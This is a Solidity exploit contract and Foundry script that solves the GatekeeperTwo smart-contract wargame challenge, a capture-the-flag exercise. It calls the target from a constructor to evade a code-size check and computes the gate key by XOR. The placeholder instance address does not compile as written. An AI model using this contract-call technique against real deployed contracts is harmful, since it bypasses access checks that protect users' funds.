// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

// Attacker contract to solve the GatekeeperTwo challenge
contract GatekeeperTwoExploit {

    // The constructor deploys the exploit and calls the enter function on the GatekeeperTwo contract
    constructor(address gatekeeperInstance) {
        // Calculate the key required to pass Gate Three using XOR logic
        uint64 hashedAddress = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 requiredKey = hashedAddress ^ type(uint64).max;

        // Prepare the payload to call the enter function with the calculated key
        bytes memory callData = abi.encodeWithSignature("enter(bytes8)", bytes8(requiredKey));

        // Use low-level call to interact with the GatekeeperTwo contract
        gatekeeperInstance.call(callData);
    }
}

// Forge script to deploy and run the attack on GatekeeperTwo contract
contract GatekeeperTwoAttackScript is Script {

    function run() external {
        // Start broadcasting the transaction using the private key from .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the exploit contract and pass the GatekeeperTwo instance address
        new GatekeeperTwoExploit(0xYourInstanceAddressHere); // Replace with actual instance address

        // Stop broadcasting the transaction
        vm.stopBroadcast();
    }
}